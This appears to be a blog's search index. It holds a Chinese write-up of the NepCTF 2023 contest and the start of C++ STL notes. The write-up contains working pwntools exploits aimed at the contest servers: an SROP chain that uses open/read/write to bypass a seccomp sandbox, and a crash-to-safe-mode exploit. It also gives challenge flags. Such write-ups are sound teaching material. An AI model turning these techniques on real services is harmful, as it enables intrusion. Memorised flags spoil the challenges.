<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2023NepCTF WP</title>
    <url>/posts/0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="2023NepCTF-WP"><a href="#2023NepCTF-WP" class="headerlink" title="2023NepCTF WP"></a>2023NepCTF WP</h1><p>真的超级紧张刺激的比赛！！有做不出题目夜不能寐的痛苦，也有冥思苦想之后的豁然开朗，第一次感受到了ctf比赛的乐趣所在。虽然最后的成绩停留在110，不过对于一个初出茅庐的萌新，已经很满足了；即使比赛结束后才做出三月七和最后放出的两个pwn题（挺气的，早知道不看万恶的login的……）。那就给自己继续加油吧，希望下次比赛能拿到属于自己的一份荣誉！</p>
<span id="more"></span>

<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h2><p>使用经典srop技巧，但是在此基础上又加了orz，观察程序会发现，能够调用sigreturn（调用号为0xf），而且溢出量足够大（0x300）。整体的一个思路就是构造system call chains，伪造四个栈帧，在syscall返回的时候，rsp会返回到另一个sigframe，从而实现一个又一个的函数调用。</p>
<p>几个注意点：</p>
<ol>
<li>利用pwntools写frame的时候对各个寄存器传入的都是地址，不能直接把字符串写进去（会bytes()报错    <del>别问为什么我知道</del>）</li>
<li>返回执行系统syscall的时候注意这个程序只有call _system，而没有直接的syscall汇编指令，而进入到call _system单步调试可以发现这个过程中各个寄存器的值是会发生变化的（不同的寄存器之间赋值），所以我们在构造frame指定寄存器值的时候需要根据call _system中的指令来调整frame的各个寄存器值，sigreturn也是如此，有其他的命令会改变rax的值，因此需要多一个pop rdi控制一下</li>
<li>各个stack_frame需要精心构造</li>
<li>因为沙箱禁掉了execve，所以我们使用open,read,write绕过沙箱。（一定注意这里读取文件内容的read系统调用rdi传参是3）</li>
</ol>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;nepctf.1cepeak.cn&#x27;</span>,<span class="number">31552</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#syscall = 0x400788</span></span><br><span class="line">syscall = <span class="number">0x04005B0</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400813</span></span><br><span class="line">sigreturn = p64(pop_rdi)+p64(<span class="number">0xf</span>)+p64(<span class="number">0x400750</span>)+p64(syscall)</span><br><span class="line">buf = <span class="number">0x0601020</span>  <span class="comment"># buf地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">frame4 = SigreturnFrame(kernel=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">frame4.rdi = constants.SYS_write<span class="comment">#rax</span></span><br><span class="line">frame4.rcx = <span class="number">0x40</span><span class="comment">#rdx</span></span><br><span class="line">frame4.rsi = <span class="number">1</span><span class="comment">#rdi</span></span><br><span class="line">frame4.rdx = buf<span class="comment">#rsi</span></span><br><span class="line">frame4.rip = syscall</span><br><span class="line">frame4.rsp = buf<span class="comment">#+len(sigreturn+bytes(sigframe))  # 设置栈顶指针位置</span></span><br><span class="line">stack3 = sigreturn+<span class="built_in">bytes</span>(frame4)</span><br><span class="line"></span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">frame2 = SigreturnFrame(kernel=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">frame2.rdi = constants.SYS_open<span class="comment">#rax</span></span><br><span class="line">frame2.rcx = <span class="number">0</span><span class="comment">#rdx</span></span><br><span class="line">frame2.rsi = buf<span class="comment">#rdi注意这里是不能直接传字符串&quot;flag&quot;的，而是应该传地址</span></span><br><span class="line">frame2.rip = syscall</span><br><span class="line">frame2.rsp = buf+<span class="number">5</span>+<span class="built_in">len</span>(sigreturn+<span class="built_in">bytes</span>(frame2))  <span class="comment"># 设置栈顶指针位置</span></span><br><span class="line">stack1 = sigreturn+<span class="built_in">bytes</span>(frame2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read2</span></span><br><span class="line">frame3 = SigreturnFrame(kernel=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">frame3.rdi = constants.SYS_read<span class="comment">#rax</span></span><br><span class="line">frame3.rcx = <span class="number">0x40</span><span class="comment">#rdx</span></span><br><span class="line">frame3.rsi = <span class="number">3</span><span class="comment">#rdi</span></span><br><span class="line">frame3.rdx = buf<span class="comment">#rsi</span></span><br><span class="line">frame3.rip = syscall</span><br><span class="line">frame3.rsp = buf+<span class="number">5</span>+<span class="built_in">len</span>(stack1+sigreturn+<span class="built_in">bytes</span>(frame3))  <span class="comment"># 设置栈顶指针位置</span></span><br><span class="line">stack2 = sigreturn+<span class="built_in">bytes</span>(frame3)</span><br><span class="line"></span><br><span class="line">stack_frame = <span class="string">b&quot;flag\x00&quot;</span>+stack1+stack2+stack3</span><br><span class="line"><span class="comment">#stack_frame = sigreturn+bytes(sigframe)+sigreturn+bytes(sframe)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read1</span></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">frame.rdi = constants.SYS_read<span class="comment">#rax</span></span><br><span class="line">frame.rcx = <span class="built_in">len</span>(stack_frame)<span class="comment">#rdx</span></span><br><span class="line">frame.rsi = <span class="number">0</span><span class="comment">#rdi</span></span><br><span class="line">frame.rdx = buf<span class="comment">#rsi</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line">frame.rsp = buf+<span class="number">5</span>  <span class="comment"># 设置栈顶指针位置</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(frame))</span><br><span class="line"></span><br><span class="line">pad = cyclic(<span class="number">0x38</span>)</span><br><span class="line">pad += sigreturn + <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.send(pad)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause(1)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(stack_frame)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308140041407.png" alt="image-20230814004138378"></p>
<p>可恶的Login找不出路径……</p>
<h2 id="HRP-CHAT-2"><a href="#HRP-CHAT-2" class="headerlink" title="HRP-CHAT-2"></a>HRP-CHAT-2</h2><p>真的服了….真的就差一步，下标没弄清楚，其实一个个试都可以试出来的….</p>
<p>获得攻击力最高的角色（需要抽卡得到，抽卡的次数会影响你的下标）</p>
<p>选择攻击力最强的技能，击败boss即可拿到flag</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308151840502.png" alt="image-20230815135736939"></p>
<h2 id="HRP-CHAT-2-1"><a href="#HRP-CHAT-2-1" class="headerlink" title="HRP-CHAT-2"></a>HRP-CHAT-2</h2><p>阅读源码</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308151840711.png" alt="image-20230815141853615"></p>
<p>main函数里执行子进程，崩溃进入CMD</p>
<p>CMD函数</p>
<p><img data-src="C:\Users\赖宇忛\AppData\Roaming\Typora\typora-user-images\image-20230815141945133.png" alt="image-20230815141945133"></p>
<p>可以想到让子进程崩溃后，进入安全模式拿flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;nepctf.1cepeak.cn&#x27;</span>,<span class="number">31971</span>)</span><br><span class="line"></span><br><span class="line">sda = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data :p.send(data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,data :p.sendlineafter(delim,data)</span><br><span class="line">ru = <span class="keyword">lambda</span> delims,drop=<span class="literal">True</span> :p.recvuntil(delims,drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">ia = <span class="keyword">lambda</span> :p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>() : <span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;help&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;Login\n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;6&#x27;</span>,<span class="string">b&#x27;Login\n&#x27;</span>*<span class="number">0x517</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;\nSafe_Mode_Key&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308151840784.png" alt="image-20230815143957697"></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>一个号只能发一次，第一次发错了….（哭）</p>
<p>NepCTF{H4ve_Fun_1N_This_Game}</p>
<h2 id="与AI共舞的哈夫曼"><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a><strong>与AI共舞的哈夫曼</strong></h2><p>年轻人就要年轻，正经人谁自己做题啊~x</p>
<p>GPT秒了</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308140017820.png" alt="image-20230814001753757"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HuffmanNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, char, freq</span>):</span><br><span class="line">        self.char = char</span><br><span class="line">        self.freq = freq</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lt__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> self.freq &lt; other.freq</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_tree</span>(<span class="params">frequencies</span>):</span><br><span class="line">    heap = [HuffmanNode(char, freq) <span class="keyword">for</span> char, freq <span class="keyword">in</span> frequencies.items()]</span><br><span class="line">    heapq.heapify(heap)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(heap) &gt; <span class="number">1</span>:</span><br><span class="line">        left = heapq.heappop(heap)</span><br><span class="line">        right = heapq.heappop(heap)</span><br><span class="line">        merged = HuffmanNode(<span class="literal">None</span>, left.freq + right.freq)</span><br><span class="line">        merged.left = left</span><br><span class="line">        merged.right = right</span><br><span class="line">        heapq.heappush(heap, merged)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> heap[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_codes</span>(<span class="params">node, current_code, huffman_codes</span>):</span><br><span class="line">    <span class="keyword">if</span> node <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        huffman_codes[node.char] = current_code</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    build_huffman_codes(node.left, current_code + <span class="string">&#x27;0&#x27;</span>, huffman_codes)</span><br><span class="line">    build_huffman_codes(node.right, current_code + <span class="string">&#x27;1&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    frequencies = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> byte <span class="keyword">not</span> <span class="keyword">in</span> frequencies:</span><br><span class="line">            frequencies[byte] = <span class="number">0</span></span><br><span class="line">        frequencies[byte] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    root = build_huffman_tree(frequencies)</span><br><span class="line">    huffman_codes = &#123;&#125;</span><br><span class="line">    build_huffman_codes(root, <span class="string">&#x27;&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line">    compressed_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        compressed_data += huffman_codes[byte]</span><br><span class="line"></span><br><span class="line">    padding = <span class="number">8</span> - <span class="built_in">len</span>(compressed_data) % <span class="number">8</span></span><br><span class="line">    compressed_data += <span class="string">&#x27;0&#x27;</span> * padding</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># Write frequency information</span></span><br><span class="line">        f.write(<span class="built_in">bytes</span>([<span class="built_in">len</span>(frequencies)]))</span><br><span class="line">        <span class="keyword">for</span> byte, freq <span class="keyword">in</span> frequencies.items():</span><br><span class="line">            f.write(<span class="built_in">bytes</span>([byte, (freq &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (freq &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (freq &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, freq &amp; <span class="number">0xFF</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Write compressed data</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(compressed_data), <span class="number">8</span>):</span><br><span class="line">            byte = compressed_data[i:i+<span class="number">8</span>]</span><br><span class="line">            f.write(<span class="built_in">bytes</span>([<span class="built_in">int</span>(byte, <span class="number">2</span>)]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">compressed_file, decompressed_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(compressed_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># 读取频率信息</span></span><br><span class="line">        num_symbols = <span class="built_in">int</span>.from_bytes(f.read(<span class="number">1</span>), byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        frequencies = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_symbols):</span><br><span class="line">            byte, freq1, freq2, freq3, freq4 = f.read(<span class="number">5</span>)</span><br><span class="line">            freq = (freq1 &lt;&lt; <span class="number">24</span>) | (freq2 &lt;&lt; <span class="number">16</span>) | (freq3 &lt;&lt; <span class="number">8</span>) | freq4</span><br><span class="line">            frequencies[byte] = freq</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构建哈夫曼树</span></span><br><span class="line">        root = build_huffman_tree(frequencies)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解压缩数据</span></span><br><span class="line">        current_node = root</span><br><span class="line">        decompressed_data = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            bit = f.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            bit = <span class="built_in">int</span>.from_bytes(bit, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> current_node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    decompressed_data.append(current_node.char)</span><br><span class="line">                    current_node = root</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (bit &gt;&gt; i) &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">                    current_node = current_node.right</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    current_node = current_node.left</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 写入解压缩后的数据</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(decompressed_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> output_f:</span><br><span class="line">            output_f.write(decompressed_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    input_file = <span class="string">&#x27;input.txt&#x27;</span></span><br><span class="line">    compressed_file = <span class="string">&#x27;compressed.bin&#x27;</span></span><br><span class="line">    decompressed_file = <span class="string">&#x27;decompressed.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解压缩文件</span></span><br><span class="line">    decompress(compressed_file, decompressed_file)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308141025369.png" alt="image-20230814101049586"></p>
<h2 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h2><p>各种尝试想要提权结果没一个函数有用的，system,getenv,mprotect甚至read甚至env本身全都禁掉了</p>
<p>只好直接输出，想到函数参数依次入栈，而env环境变量也是main函数的一个参数，从而想到在argc的基础上++移动指针，暴力输出大量数据，从中找到flag</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">( <span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> （<span class="type">int</span> i = <span class="number">0</span>; i&lt; argc; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j&lt;<span class="number">700</span>;++j)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&#x27;: %s n&quot;</span>, i, argv［ i 」 + j );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><del>（优雅）</del></p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308151126222.png" alt="image-20230814002546260"></p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308140026993.png" alt="image-20230814002608949"></p>
<h2 id="小叮弹钢琴"><a href="#小叮弹钢琴" class="headerlink" title="小叮弹钢琴"></a>小叮弹钢琴</h2><p>mid音频隐写（我思考velato这样的音符编程语言尝试了好久最后发现就是个隐写？？）</p>
<p>前半段是短音符和长音符，判断是摩斯电码，后面的是一串十六进制数字</p>
<p>摩斯电码解码得到tip：youshouldusethistoxorsomething</p>
<p>真，一开始断句成了this tox or something （甚至找了半天tox是啥）</p>
<p>接下来异或卡了好久，愣是没想到是用这句话去异或</p>
<p>之后联想前几个字母是NepCTF，尝试发现与之异或的是you，才发现把youshouldusethistoxorsomething这句话去异或0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17就行了</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308140038661.png" alt="image-20230814003810621"></p>
<h2 id="陌生的语言"><a href="#陌生的语言" class="headerlink" title="陌生的语言"></a>陌生的语言</h2><p>由给出的hint可知是小魔女学园的月文和龙语。</p>
<p>纯粹的信息收集了</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308140038297.jpg"></p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308141000511.jpg" alt="img"></p>
<p>NepCTF{NEPNEP_A_BELIEVING_Heart_is_your_magic}</p>
<h2 id="ConnectedFive"><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h2><p>真的是下棋下出来的</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308140050622.png" alt="image-20230814005007869"></p>
<h2 id="你也喜欢三月七么"><a href="#你也喜欢三月七么" class="headerlink" title="你也喜欢三月七么"></a>你也喜欢三月七么</h2><p>题目所给附件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">salt_lenth= <span class="number">10</span> </span><br><span class="line">key_lenth= <span class="number">16</span> </span><br><span class="line">iv= 88219bdee9c396eca3c637c0ea436058 <span class="comment">#原始iv转hex的值</span></span><br><span class="line">ciphertext= </span><br><span class="line">b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc</span><br></pre></td></tr></table></figure>

<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308292027548.png" alt="image-20230829202743433"></p>
<p>看上去是AES，根据题目：</p>
<p>salt&#x3D;NepCTF2023</p>
<p>salt用sha256加密后得到key，解得sha256（salt）&#x3D; dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009</p>
<p>截取前十六位为key</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009&#x27;</span></span><br><span class="line">iv_hex = <span class="string">&#x27;88219bdee9c396eca3c637c0ea436058&#x27;</span> <span class="comment">#原始iv转hex的值</span></span><br><span class="line">ciphertext= <span class="string">&#x27;&#x27;&#x27;b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把hex值转成bytes</span></span><br><span class="line">iv = <span class="built_in">bytes</span>.fromhex(iv_hex)</span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(key)[:<span class="number">16</span>]</span><br><span class="line">ciphertext = <span class="built_in">bytes</span>.fromhex(ciphertext)</span><br><span class="line"></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">plaintext = aes.decrypt(ciphertext)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;plaintext:&#x27;</span>, plaintext)</span><br><span class="line"><span class="comment"># plaintext: b&#x27;6148523063484d364c793970625763784c6d6c745a3352774c6d4e76625338794d44497a4c7a41334c7a49304c336c5061316858553070554c6e42755a773d3d&#x27;</span></span><br></pre></td></tr></table></figure>

<p>base64解码得到url</p>
<p>解压压缩包得</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308292030306.png" alt="image-20230829203026261"></p>
<p>找了找星铁的文字</p>
<p>对找得到flag</p>
<p>NepCTF{HRP_aIways_likes_March_7th}</p>
]]></content>
      <categories>
        <category>赛题复现</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>C++STL 学习笔记</title>
    <url>/posts/45592537/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="C-STL-学习笔记"><a href="#C-STL-学习笔记" class="headerlink" title="C++STL 学习笔记"></a>C++STL 学习笔记</h1><span id="more"></span>

<h2 id="STL补充"><a href="#STL补充" class="headerlink" title="STL补充"></a>STL补充</h2><h3 id="List-链表"><a href="#List-链表" class="headerlink" title="List  链表"></a>List  链表</h3><ul>
<li><p><code> list&lt;int&gt; mylist = &#123; &#125;</code>链表定义和初始化</p>
</li>
<li><p><code>void push_front(const T &amp; val) </code> 将 val 插入链表最前面 </p>
</li>
<li><p><code>void pop_front()  </code> 删除链表最前面的元素 </p>
</li>
<li><p><code>list.push_back()</code> 增加一个新的元素在 list 的尾端 </p>
</li>
<li><p><code>list.pop_back()</code> 删除 list 的最末个元素 </p>
</li>
<li><p><code>void sort() </code>  将链表从小到大排序 </p>
</li>
<li><p><code>reverse()</code>反转链表</p>
</li>
<li><p><code>list.empty()</code> 若list内部为空，则回传true值 </p>
</li>
<li><p><code>list.size()</code> 回传list内实际的元素个数 </p>
</li>
<li><p><code>list.front()</code> 存取第一个元素 </p>
</li>
<li><p><code>list.back()</code> 存取最末个元素 </p>
</li>
<li><p><code>mylist.begin()</code> 首位迭代器</p>
</li>
<li><p><code>mylist.end()</code>末位迭代器</p>
</li>
<li><p>常见for循环</p>
<ul>
<li><p><code>for (auto it = mylist.begin(); it != mylist.end(); ++it)  </code></p>
<pre><code>                  `cout &lt;&lt; *it &lt;&lt; &quot; &quot;;` 
</code></pre>
</li>
<li><p>it是迭代器指针，不能赋值，不能运算（+&#x3D;不行），只能++</p>
</li>
<li><p>list的迭代器只支持双向访问，不支持随机访问，因此不能直接进行加减操作 （和vector等区别）</p>
</li>
</ul>
</li>
<li><p><code>advance(it, n); </code>将迭代器<code>it</code>向前移动n个位置 </p>
</li>
<li><p><code>mylist.insert(it, k);</code>  向第it位迭代器位置插入新元素k（it之前）</p>
</li>
<li><p><code>mylist.erase(it);</code> 删除第it位迭代器位置所指元素</p>
</li>
<li><p><code>mylist.erase(it, it + n); </code>删除第it位到第it+n位元素（一共删除从it开始到it+n的n个元素）</p>
</li>
<li><p><code>next(it,n)</code>函数是C++ STL中的一个函数，它的作用是返回一个新的迭代器，该迭代器指向原始迭代器向前或向后移动指定距离后的位置 ，被用来移动it迭代器到下n位</p>
</li>
</ul>
<h3 id="vector-存放任意类型的动态数组"><a href="#vector-存放任意类型的动态数组" class="headerlink" title="vector  存放任意类型的动态数组"></a>vector  存放任意类型的动态数组</h3><ul>
<li><code>vector&lt;T&gt;(nSize,t)</code>创建一个vector，元素个数为nSize,且值均为t</li>
<li><code>vector.push_back(k)</code> 在vector尾部插入元素k</li>
<li><code>vector.insert(vector.begin() + 1, 2) </code> 在vector的第2个位置插入一个元素2 </li>
<li><code>vector.pop_back() </code> 删除vector尾部的一个元素 </li>
<li><code>vector.erase(v.begin() + 1) </code>删除vector的第2个元素 </li>
<li><code>erase()</code>方法接受两个迭代器参数，表示要删除的区间的起始位置和结束位置。被删除的区间包括起始位置的元素，但不包括结束位置的元素。 </li>
